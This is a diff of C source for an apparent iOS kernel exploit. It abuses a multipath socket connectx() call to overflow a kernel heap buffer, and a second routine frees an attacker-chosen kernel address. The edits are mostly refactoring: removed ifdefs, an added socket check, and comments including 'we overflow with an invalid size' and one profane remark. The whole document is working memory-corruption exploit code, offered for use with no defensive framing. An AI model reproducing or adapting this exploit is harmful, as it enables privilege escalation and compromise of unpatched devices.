@@ -9,19 +9,13 @@
 
 #include <netinet/in.h>
 #include <sys/socket.h>
+#include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-
-#ifndef AF_MULTIPATH
-#define AF_MULTIPATH 39
-#endif
-
-#define MULTIPATH_ERRNO_CHECK // Enable rudimentary error checking. Not thread-safe.
-#ifdef MULTIPATH_ERRNO_CHECK
 #include <errno.h>
-#endif
+#define MULTIPATH_ERRNO_CHECK // Enable rudimentary error checking. Not thread-safe.
 
 #pragma pack(push, 1)
 struct not_todescos_not_essers_ipc_object
@@ -38,7 +32,7 @@ static void _multipath_connectx_overflow(int sock, void *buf, size_t n)
 {
     struct sockaddr_in *sa_dst = calloc(1, 0x4000);
     memset(sa_dst, 0x0, 0x4000);
-    memcpy(sa_dst, buf, n);
+    memcpy(sa_dst, buf, n); //see what we do here, we overflow with an invalid size
     sa_dst->sin_family = AF_UNSPEC;
     sa_dst->sin_len = n;
     
@@ -53,35 +47,34 @@ static void _multipath_connectx_overflow(int sock, void *buf, size_t n)
     sae.sae_srcaddrlen = 255;
     sae.sae_dstaddr = (struct sockaddr *)sa_dst;
     sae.sae_dstaddrlen = (socklen_t)n;
-    
-#ifdef MULTIPATH_ERRNO_CHECK
     errno = 0;
-#endif
     
     // Trigger overflow
     connectx(sock, &sae, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
     
     // We expect return value -1, errno 22 on success (but they don't guarantee it)
-    
-#ifdef MULTIPATH_ERRNO_CHECK
     if (errno == 1) {
-        // Protip: Apple actually charges more than $100 for some regions (RIP 1000 SEK)
         *(int *)("You") = (int)"need to pay Apple $100 (add the multipath entitlement)";
     }
     else if (errno == 47) {
         *(int *)("You") = (int)"need to find another bug (iOS <= 11.3.1 only)";
     }
-#endif
     
-    free(sa_dst);
+    if(sa_dst) {
+        free(sa_dst);
+    }
 }
 
 static void _multipath_kfree(int sock, uint64_t addr, size_t addr_size)
 {
-    struct not_todescos_not_essers_ipc_object s;
-    memset(&s, 0x00, sizeof(s));
+    if(sock<0) {
+        printf("This doesn't seem like a correct socket, trying anyway...\n");
+    }
+    
+    struct not_todescos_not_essers_ipc_object s = {0};
+    //memset(&s, 0x00, sizeof(s)); //Why the fuck would you use memset if you can initialize
+    
     memset(&s.nonzeroes, 0x42, sizeof(s.nonzeroes));
-    //memset(&_s1.nonzeroes2, 0x42, sizeof (_s.nonzeroes2)); // Irrelevant
     s.mpte_itfinfo_size = 8; // > 4
     s.mpte_itfinfo = addr; // Address to free
     
